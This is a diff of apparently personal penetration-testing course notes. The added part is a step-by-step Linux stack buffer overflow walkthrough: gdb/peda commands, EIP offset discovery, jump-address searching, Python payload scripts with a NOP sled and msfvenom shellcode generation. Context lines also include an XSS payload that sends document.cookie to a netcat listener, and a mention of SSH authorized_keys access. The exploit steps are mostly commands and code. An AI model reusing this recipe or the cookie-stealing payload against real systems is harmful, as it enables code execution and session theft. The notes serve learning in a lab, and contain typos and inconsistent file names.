@@ -11,10 +11,115 @@ ssh www-data@localhost -p2222
 
 Instead of /var/www , it may be within a systems user. This could be seen as /home/Comrade/.ssh/authorized_keys
 If you are going into someone's ssh known as comrade. This can be applied into the lesson by using the extranet.
+################################################################################################################################
+Linux python script and such
+################################################################################################################################
+### Linux
+disass <function> #
+Certain scripts can take user input ./func <<<$(echo "sjdlfnmlse")
+Certain scripts can take parameters ./func $(echo "ojksdmiosdkosf")
+gdb ./inventory.exe -> run <<<$(pyhton peebuff.py)
 
-################################
+vim
+gdb ./func -> run -> info functions -> pdisass main -> pdisass getuserinput
+If a system does not have the peda plugin, open-source research the functions and find vulnerabilities.
+
+####
+vim lynnbuff.py
+#!/usr/bin/env python
+
+offset = "wijejnsoifoosmkefmsks"
+print(offset)
+#####
+firefox on linux workstation -> wiremask.eu -> tools -> buffer overflow pattern generator
+Instructor pointer is what we are targeting, EIP.
+Copy the Hex given, use that HEX to find the offset (Register Value), use that offset to find the actual offset.
+
+After finding the offset, recreate script as
+####
+#!/usr/bin/env python
+
+offset = "wijejnsoifoosmkefmsks"
+eip = "BBBB"
+print(offset+eip)
+#####
+type shell in your peda -> env - gdb ./func -> show env -> unset env COLUMNS , unset env LINES -> show env
+ctrl + c -> info proc map -> find /b (START HEX AFTER HEAP), (END IN HEX LINE), 0xff, 0xe4
+(0xe4 and 0xff are jump locations)
+####
+#!/usr/bin/env python
+
+offset = "wijejnsoifoosmkefmsks"
+eip = "BBBB"
+print(offset+eip)
+
+'''
+HEX1 -> Little Endian (from the back) 
+HEX2
+HEX3
+HEX4
+HEX5
+'''
+#####
+type shell in your peda -> env - gdb ./func -> show env -> unset env COLUMNS , unset env LINES -> show env -> run -> ctrl+C DO NOT ENTER
+info proc map -> find /b (START HEX AFTER HEAP), (END IN HEX LINE), 0xff, 0xe4
+(0xe4 and 0xff are jump locations)
+####
+#!/usr/bin/env python
+
+offset = "wijejnsoifoosmkefmsks"
+eip = "\x59\x3b\xde\xf7"
+nop = "\x90" * 15
+print(offset+eip+nop)
+
+'''
+HEX1 -> Little Endian (from the back) 
+HEX2
+HEX3
+HEX4
+HEX5
+'''
+#####
+make your eip your first little endian
+0xf7de3b59 -> \x59\x3b\xde\xf7"
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+
+quit to leave gbd or shell to go to shell
+
+msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+
+#####
+type shell in your peda -> env - gdb ./func -> show env -> unset env COLUMNS , unset env LINES -> show env
+ctrl + c -> info proc map -> find /b (START HEX AFTER HEAP), (END IN HEX LINE), 0xff, 0xe4
+(0xe4 and 0xff are jump locations)
+####
+#!/usr/bin/env python
+
+offset = "wijejnsoifoosmkefmsks"
+eip = "\x59\x3b\xde\xf7"
+nop = "\x90" * 15
+buf = 
+print(offset+eip+nop+buf)
+
+'''
+HEX1 -> Little Endian (from the back) 
+HEX2
+HEX3
+HEX4
+HEX5
+msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+'''
+#####
+If there is an error regenerate msfvenom buf lines and reattempt.
+./func <<<$(python linbuff.py)
+
+0xf7def000 0xffffe000
+################################################################################################################################################################
 Cross-Site Scripting:
-################################
+################################################################################################################################################################
 nc -l 127.0.0.1 42070
 <script>document.location="http://127.0.0.1:42070/?username=" + document.cookie;</script>
 
